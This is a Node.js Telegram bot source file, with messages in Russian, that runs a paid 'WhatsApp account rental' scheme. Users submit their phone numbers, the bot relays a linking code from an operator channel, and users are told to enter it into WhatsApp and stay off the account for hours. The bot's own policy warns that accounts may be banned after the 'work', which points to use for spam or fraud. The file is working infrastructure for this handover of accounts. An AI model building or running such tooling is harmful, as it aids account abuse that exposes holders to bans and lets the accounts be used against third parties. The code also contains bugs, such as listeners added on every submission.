require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

// Получаем токен из .env
const token = process.env.BOT_API_KEY;
const bot = new TelegramBot(token, { polling: true });

// ID канала, куда будут отправляться сообщения
const channelId = '-1002647515056'; // Замените на Ваш ID канала

// Хранение времени последней отправки номера для каждого пользователя
const userLastSendTime = {};

// Функция для проверки времени работы бота
function isBotActive() {
    const mskOffset = 3; // Московское время (UTC+3)
    const date = new Date();
    const mskHours = (date.getUTCHours() + mskOffset) % 24; // Приводим к московскому времени

    return (mskHours >= 10 && mskHours < 15) || (mskHours >= 16 && mskHours < 20); // Бот работает с 10:00 до 14:00 и с 15:00 до 21:00
}

// Обработка команды /start
bot.onText(/\/start/, (msg) => {
    if (!isBotActive()) {
        bot.sendMessage(msg.chat.id, 'Бот работает с 10:00 до 20:00 а в промежудке с 15:00 до 16:00 обед \n'+'Просим прощение от всей нашей команды за ваше ожидание\n');
        return;
    }

    const chatId = msg.chat.id;
    const welcomeMessage = ('Приветствую вас\\!\n' +
        '\n' +
        'В нашем боте Вы можете сдать свой аккаунт WhatsApp и получить за это деньги\\. Это просто и удобно\\!\n' +
        '\n' +
        'Наша тг группа\\(там выплаты\\) \\- [*группа*](https://t.me/+7jumLq4x1hE5YmJh)\\. \n' +
        '\n' +
        'Вот что Вам нужно сделать\\:\n' +
        'Сдайте свой номер телефона 📱\\.\n' +
        'Введите полученный код в приложении WhatsApp 📝\\.\n' +
        'Поддерживайте дальнейшее сотрудничество с нами 🤝\\.\n' +
        '\n' +
        'Если у Вас возникли вопросы\\, не стесняйтесь обращаться в [*наш чат*](https://t.me/c/2496330352/35)\\.\n' +
        '\n' +
        'Время приема номеров\\: с 10\\:00 до 20\\:00 по московскому времени \\(MCK\\)\\.\n' +
        'С 15:00 до 16:00 обед \n'+
        'Обращаем Ваше внимание\\, что работа осуществляется исключительно в будние дни\\!\n' +
        '\n' +
        'Для новичков\\, которые не уверены\\, куда вводить код и имеют другие вопросы\\, мы подготовили обучающую информацию в [тг обучалке](https://t.me/c/2496330352/6)\n' +
        '\n' +
        '*Чтобы сдать номер\\, просто нажмите на кнопку в низу экрана "сдать номер"*\n' +
        '\n' +
        'Ждем вас1\\!');

    const options = {
        reply_markup: {
            keyboard: [
                ['Наша политика', 'Реферальная программа'],
                ['Сдать номер']
            ],
            resize_keyboard: true,
            one_time_keyboard: true 
        },
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
    };

    // Отправляем сообщение
    bot.sendMessage(chatId, welcomeMessage, options);
});

// Обработка текстовых сообщений
bot.on('message', (msg) => {
    const chatId = msg.chat.id;

    if (!isBotActive()) {
        bot.sendMessage(chatId, 'Бот работает с 10:00 до 20:00 а в промежудке с 15:00 до 16:00 обед \n'+'Просим прощение от всей нашей команды за ваше ожидание\n');
        bot.sendMessage(msg.chat.id, );
        return;
    }

    if (msg.text === 'Наша политика') {
        const policyMessage = '1-Мы не несем ответственность за ваш аккаунт после его сдачи в аренду\n'+
        '2-выплаты приходят строго по отчету, и мы платим тем у кого номер стоял от часа\n' +
        '3-нет отчета, нет выплаты\n' +
        '4-оски в чатах запрещены\n'+
        '5-ваш акк после ворка могут забанить, форма для разбана есть в чате\n';
        bot.sendMessage(chatId, policyMessage, {
            reply_markup: {
                keyboard: [['Назад']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    } else if (msg.text === 'Реферальная программа') {
        const aboutMessage = 'Наша команда думает над реализацией реферальной программы'; // Здесь добавьте текст о вас
        bot.sendMessage(chatId, aboutMessage, {
            reply_markup: {
                keyboard: [['Назад']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    } else if (msg.text === 'Сдать номер') {
        bot.sendMessage(chatId, 'Напиши свой номер\n' +
            'Пример\\: *\\+79128638512*\n' +
            'После введения номера дождитесь кода и введите его в свой WhatsApp\n' +
            '\n' +
            'Если Вы не знаете куда вводить код \\: [*тг обучалка*](https://t.me/c/2496330352/6)\n', {
            parse_mode: 'MarkdownV2',
            disable_web_page_preview: true,
            reply_markup: { remove_keyboard: true }
        });
    } else if (msg.text === 'Назад') {
        const welcomeMessage = 'Приветствую вас\\!\n' +
        '\n' +
        'В нашем боте Вы можете сдать свой аккаунт WhatsApp и получить за это деньги\\. Это просто и удобно\\!\n' +
        '\n' +
        'Наша тг группа\\(там выплаты\\) \\- [*группа*](https://t.me/+7jumLq4x1hE5YmJh)\n' +
        '\n' +
        'Вот что Вам нужно сделать\\:\n' +
        'Сдайте свой номер WhatsApp 📱\\.\n' +
        'Введите полученный код в приложении WhatsApp 📝\\.\n' +
        'Поддерживайте дальнейшее сотрудничество с нами 🤝\\.\n' +
        '\n' +
        'Если у Вас возникли вопросы\\, не стесняйтесь обращаться в [*наш чат*](https://t.me/c/2496330352/35)\\.\n' +
        '\n' +
        'Время приема номеров\\: с 10\\:00 до 20\\:00 по московскому времени \\(MCK\\)\\.\n' +
        'С 15:00 до 16:00 обед \n'+
        'Обращаем Ваше внимание\\, что работа осуществляется исключительно в будние дни\\!\n' +
        '\n' +
        'Для новичков\\, которые не уверены\\, куда вводить код и имеют другие вопросы\\, мы подготовили обучающую информацию в [тг обучалке](https://t.me/c/2496330352/6)\n' +
        '\n' +
        '*Чтобы сдать номер\\, просто нажмите на кнопку в низу экрана "сдать номер"*\n' +
        '\n' +
        'Ждем вас1\\!';

        const options = {
            reply_markup: {
                keyboard: [
                    ['Наша политика', 'Реферальная программа'],
                    ['Сдать номер']
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            },
            parse_mode: 'MarkdownV2',
            disable_web_page_preview: true,
        };

        bot.sendMessage(chatId, welcomeMessage, options);
    } else {
        handlePhoneNumber(msg);
    }
});

function handlePhoneNumber(msg) {
    const chatId = msg.chat.id;
    const messageText = msg.text;
    const currentTime = Date.now();

    // Проверяем, является ли сообщение 11-значным номером
    if (/^\+?\d{10,11}$/.test(messageText)) {
        // Проверяем, прошло ли 5 минут с последней отправки
        if (userLastSendTime[chatId] && (currentTime - userLastSendTime[chatId]) < 300000) {
            bot.sendMessage(chatId, 'Вы сможете отправить номер только через 5 минут.');
            return;
        }

        userLastSendTime[chatId] = currentTime; // Обновляем время последней отправки

        bot.sendMessage(chatId, 'Будьте на связи! Код подтверждения придет в течение 1-8 минут.\n' +
            '\n' +
            'Важно:\n' +
            'введите код сразу после получения. У Вас будет всего 1 минута 30 секунд.\n' +
            '\n' +
            'Если не успели ввсти код нажмите кнопку "нет".\n'
        );

        bot.sendMessage(channelId, messageText).then((sentMessage) => {
            // Обработка ответов из канала, группы или супергруппы
            bot.on('message', (responseMsg) => {
                // Проверяем, что сообщение пришло из канала, группы или супергруппы
                if (responseMsg.reply_to_message && responseMsg.reply_to_message.text === messageText) {
                    const replyMarkup = {
                        inline_keyboard: [
                            [
                                { text: 'Да', callback_data: `yes_${messageText}` },
                                { text: 'Нет', callback_data: `no_${messageText}` },
                            ]
                        ]
                    };

                    if (responseMsg.photo) {
                        bot.sendPhoto(chatId, responseMsg.photo[responseMsg.photo.length - 1].file_id, {
                            caption: `код: картинка \n\nвписали код?`,
                            reply_markup: replyMarkup
                        });
                    } else {
                        bot.sendMessage(chatId, `код: ${responseMsg.text}\n\nвписали код?`, {
                            reply_markup: replyMarkup
                        });
                    }
                }
            });
        });
    }
}

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data.split('_');
    const action = data[0];
    const number = data[1];

    if (!isBotActive()) {
        bot.sendMessage(chatId, 'Бот не работает в данный момент.\n' +'Бот работает с 10:00 до 20:00 а в промежудке с 15:00 до 16:00 обед \n'+'Просим прощение от всей нашей команды за ваше ожидание\n');

        return;
    }

    if (action === 'yes') {
        bot.sendMessage(channelId, `ДА номер: ${number}`);
        bot.sendMessage(chatId, '👍');
        bot.sendMessage(chatId, 'Ваш WhatsApp успешно сдан в аренду\\. Для сохранения аренды\\, пожалуйста\\, не заходите в WhatsApp в течение 3 часов\\.\n' +
            '\n' +
            'После сдачи номера необходимо предоставить отчет о времени сдачи по московскому времени\\.\n' +
            'Пример отчета\\: \\+79128638512 встал 14\\:00 по мск\\.\n' +
            'Сдача отчета \\- [*отчет*](https://t.me/c/2496330352/11)\n'+
            '\n' +
            'Отсутствие отчета приведет к отмене выплаты\\. Выплаты производятся в нашей группе в 21\\:00 по московскому времени\\.\n', {
                parse_mode: 'MarkdownV2',
                disable_web_page_preview: true,
            }
        );

        bot.sendMessage(chatId, 'Если у Вас есть еще номер нажмите повторно кнопку "Сдать номер" через 5 мин.', {
            reply_markup: {
                keyboard: [['Сдать номер']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    } else if (action === 'no') {
        bot.sendMessage(channelId, `НЕТ номер: ${number}`);
        bot.sendMessage(chatId, '🤔');

        bot.sendMessage(chatId, 'Пожалуйста, отправьте номер повторно через 5 минут.', {
            reply_markup: {
                keyboard: [['Сдать номер']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }
});
